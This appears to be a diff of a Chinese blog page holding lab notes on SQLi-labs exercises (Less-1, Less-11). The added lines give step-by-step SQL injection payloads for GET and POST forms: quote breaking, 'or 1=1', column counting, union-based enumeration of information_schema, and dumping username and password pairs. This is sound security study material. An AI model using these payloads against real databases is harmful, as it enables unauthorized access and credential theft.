@@ -108,7 +108,7 @@
           
             <h2 class="last-time">
               <span>最后更新于</span>
-              <time  class="article-updated" datetime="2025-10-14T12:51:51.161Z" itemprop="dateUpdated">2025-10-14</time>
+              <time  class="article-updated" datetime="2025-10-17T09:55:05.427Z" itemprop="dateUpdated">2025-10-17</time>
             </h2>
           
           
@@ -141,16 +141,27 @@
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
         <h1 id="LESS-1"><a href="#LESS-1" class="headerlink" title="LESS-1"></a>LESS-1</h1><p><img src="/./img/less1.png" alt="图片"></p>
 <ul>
-<li>发送get请求，?id&#x3D;1,返回用户名和密码</li>
+<li>发送get请求，?id&#x3D;1,正常输出用户名和密码</li>
 <li>?id&#x3D;1’报错</li>
-<li>?id&#x3D;-1’ or 1&#x3D;1是否能被过滤掉，正常输出</li>
+<li>?id&#x3D;-1’ or 1&#x3D;1–+正常输出，存在注入点(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)</li>
 <li>判断列数，?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列</li>
-<li>查回显</li>
-<li>查列名</li>
-<li>查表名</li>
+<li>查回显，?id&#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示</li>
+<li>查库名，?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata;–+(group_concat用于合并查询到结果)</li>
+<li>查表名，?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’;–+</li>
+<li>查列名，?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’;–+</li>
+<li>查字段，?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users;–+</li>
 </ul>
 <h1 id="LESS-5"><a href="#LESS-5" class="headerlink" title="LESS-5"></a>LESS-5</h1><p><img src="/./img/less5.png" alt="图片"></p>
-<h1 id="LESS-11"><a href="#LESS-11" class="headerlink" title="LESS-11"></a>LESS-11</h1><p><img src="/./img/less11.png" alt="图片"></p>
+<h1 id="LESS-11-（post型）"><a href="#LESS-11-（post型）" class="headerlink" title="LESS-11 （post型）"></a>LESS-11 （post型）</h1><p><img src="/./img/less11.png" alt="图片"></p>
+<ul>
+<li>bp拦截得到uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit可以成功登录</li>
+<li>username&#x3D;admin’ or 1&#x3D;1#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</li>
+<li>判断列数，username&#x3D;admin’ order by 1,2;–+ 到3时报错，有2列,之后和less-1的类似</li>
+<li>查库名，union select 1,group_concat(schema_name) from information_schema.schemata;–+(group_concat用于合并查询到结果)</li>
+<li>查表名，union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’;–+</li>
+<li>查列名，union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’;–+</li>
+<li>查字段，union select 1,group_concat(concat_ws(‘~’,username,password) )from security.users;–+</li>
+</ul>
 
       </section>
 
